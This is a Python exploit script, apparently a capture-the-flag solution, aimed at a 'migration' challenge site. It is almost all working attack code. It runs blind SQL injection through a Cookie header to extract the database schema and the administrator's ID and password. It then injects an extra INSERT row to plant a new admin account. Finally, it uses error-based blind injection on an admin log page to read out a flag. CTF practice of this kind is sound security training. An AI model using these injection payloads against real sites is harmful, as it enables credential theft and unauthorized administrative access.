import os
import random

SITEA = "http://migration.sstf.site:5555/"
SITEB = "http://migration.sstf.site:7777/"
DUMMY = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 10))
ID = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 10))

def blind_aux(q):
    uri = SITEA + "migrate.php"
    res = os.popen("""curl '%s' -s -H "Cookie: id=' or (%s) -- - ; pw=1" """ % (uri, q)).read()
    if "No matched ID" in res:
        result = False
    elif "User ID, encrypted" in res:
        result = True
    else:
        print(res)
    return result

def blind_aux2(q):
    uri = SITEB + "admin.php?mode=log"
    q = q.replace("&", "%26")
    res = os.popen("""curl '%s' -s -H "Cookie: id=%s; pw=1" -d "idx=1 or pow(~0, ~0 * (%s))" """ % (uri, ID, q)).read()
    if "Error occurred" in res:
        result = True
    elif "Log hidden" in res:
        result = False
    else:
        print(res)
    return result

def get_string(query):
    whole = ""
    for i in range(1, 100):
        result = 0
        for j in range(8):
            a = blind_aux("ord(mid((%s), %d, 1)) & %d > 0" % (query, i, 2 ** j,))
            result += (2 ** j) if a else 0
        if result == 0:
            break
        whole += chr(result)
    return whole

def get_string2(query):
    whole = ""
    for i in range(1, 100):
        result = 0
        for j in range(8):
            a = blind_aux2("ord(mid((%s), %d, 1)) & %d > 0" % (query, i, 2 ** j,))
            result += (2 ** j) if a else 0
        if result == 0:
            break
        whole += chr(result)
    return whole

print("--- KNOW MEMBER TABLE SCHEMA")
for i in range(4):
    a = get_string("select column_name from information_schema.columns where table_name='member' limit %d, 1" % i)
    print(a)

print("--- CHECK ADMIN RECORD")
a = get_string("select idx from member where is_admin=1 limit 1")
print("idx :", a)
a = get_string("select user_id from member where is_admin=1 limit 1")
print("user_id :", a)
a = get_string("select password from member where is_admin=1 limit 1")
print("password :", a)

print("--- INSERT NEW RECORD (ID : %s)" % ID)
os.system("""curl '%smigrate.php' -H 'Cookie: id=user1; pw=1' --data-raw "id=%s', '%s'), (NULL, 1, '%s&pw=1" """ % (SITEA, DUMMY, DUMMY, ID))
print()

print("--- GET FLAG")
print(get_string2("select pw from information limit 1"))
